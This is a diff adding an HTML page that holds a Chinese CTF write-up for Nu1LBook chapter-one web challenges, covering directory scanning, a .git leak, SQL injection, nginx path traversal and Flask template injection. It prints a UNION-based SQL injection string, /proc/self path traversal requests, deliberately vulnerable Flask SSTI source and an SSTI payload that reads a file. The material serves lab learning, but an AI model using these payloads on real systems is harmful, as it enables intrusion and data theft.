@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<script src="https://cdn.jsdelivr.net/npm/texme@1.2.2"></script>
+<meta name="referrer" content="no-referrer">
+<head>
+    <meta charset="UTF-8">
+    <title>Nu1LBook第一章wp</title>
+</head>
+<body>
+<textarea>
+
+
+# [第一章 web入门]常见的搜集
+
+## 硬扫
+
+打开页面提示信息搜集
+
+
+
+![image-20201109191454703](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132244492-359770402.png)
+
+
+
+扫描就完事了，扫出来robots.txt、index.php~和.index.php.swp
+
+![image-20201109191503594](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132244857-1597466579.png)
+
+![image-20201109191522788](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132245263-1780283943.png)
+
+![image-20201109194421877](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132245622-1560254552.png)
+
+
+
+![image-20201109193650672](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132246026-1181389043.png)
+
+
+
+```
+n1book{info_1s_v3ry_imp0rtant_hack}
+```
+
+# [第一章 web入门]粗心的小李
+
+## .git泄露
+
+使用githack或者githacker
+
+![image-20201109194821129](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132246341-824543893.png)
+
+![image-20201109195406270](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132246746-1683360944.png)
+
+
+
+如果用的是githack，使用命令git chechout-index -a来得到index页面
+
+![image-20201109195347885](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132247110-790007756.png)
+
+
+
+index.html:
+
+![image-20201109195419820](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132247436-1217729386.png)
+
+```
+n1book{git_looks_s0_easyfun}
+```
+
+
+
+# [第一章 web入门]SQL注入-1
+
+## 常规注入
+
+首先确定是字符型的还是数字型的：
+
+![image-20201109195650850](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132247742-1388422534.png)
+
+![image-20201109195753084](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132248058-185740663.png)
+
+然后确定字段数量
+
+![image-20201109200403363](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132248408-1126329567.png)
+
+常规爆库名、表名、列名
+
+```
+id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='fl4g'),(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23
+```
+
+![image-20201109201127797](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132248856-1500230368.png)
+
+![image-20201109201403204](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132249264-1940310651.png)
+
+```
+n1book{union_select_is_so_cool}
+```
+
+
+
+# [第一章 web入门]SQL注入-2
+
+## 考报错注入
+
+post方法，直接hackbar里写，用报错注入。
+
+![image-20201112203933902](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132249670-1799348440.png)
+
+库是note
+
+![image-20201112204043089](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132250072-1214219954.png)
+
+爆表名列名和flag
+
+![image-20201112203902754](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132250467-1553510745.png)
+
+# [第一章 web入门]afr_1
+
+![image-20201109203248359](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132250751-1378203317.png)
+
+![image-20201109203307294](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132251046-971330864.png)
+
+
+
+# [第一章 web入门]afr_2
+
+## nginx配置错误导致目录穿越
+
+![image-20201112205127708](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132251638-367561607.png)
+
+查看静态文件
+
+![image-20201112205158280](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132252357-1322787075.png)
+
+直接在img后面加两个.，使目录变为img/..
+
+![image-20201112205212125](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132252789-130161940.png)
+
+##### 读flag
+
+![image-20201112205411804](https://img2020.cnblogs.com/blog/1858293/202011/1858293-20201113132253204-500852270.png)
+
+# [第一章 web入门]afr_3
+
+## 摘自官方wp
+
+本题考查对linux系统中/proc/目录下文件作用的了解，同时考查了flask模板注入
+
+1. 请求 http://IP:PORT/article?name=../../../../../proc/self/cmdline获取当前执行系统命令，得到
+
+```bash
+python server.py
+```
+
+1. 请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/server.py获取源码
+2. 审计源码，发现flag在flag.py,flask的appkey在key.py,但是此处任意文件读取漏洞被过滤了关键词flag
+3. 源码里存在flask SSTI，前提是可以伪造flask的cookie，这里需要用到appkey https://noraj.github.io/flask-session-cookie-manager/
+
+```python
+@app.route("/n1page", methods=["GET", "POST"])
+def n1page():
+    if request.method != "POST":
+        return redirect(url_for("index"))
+    n1code = request.form.get("n1code") or None
+    if n1code is not None:
+        n1code = n1code.replace(".", "").replace("_", "").replace("{","").replace("}","")
+    if "n1code" not in session or session['n1code'] is None:
+        session['n1code'] = n1code
+    template = None
+    if session['n1code'] is not None:
+     '''
+     这里存在SSTI
+     '''
+        template = '''<h1>N1 Page</h1> <div class="row> <div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>? </div> </div> ''' % session['n1code']
+        session['n1code'] = None
+    return render_template_string(template)
+```
+
+所以请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/key.py获取appkey
+
+1. 伪造cookie为SSTI的payload获取flag.
+
+```
+{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}
+```
+</textarea>
+</body>
+</html>
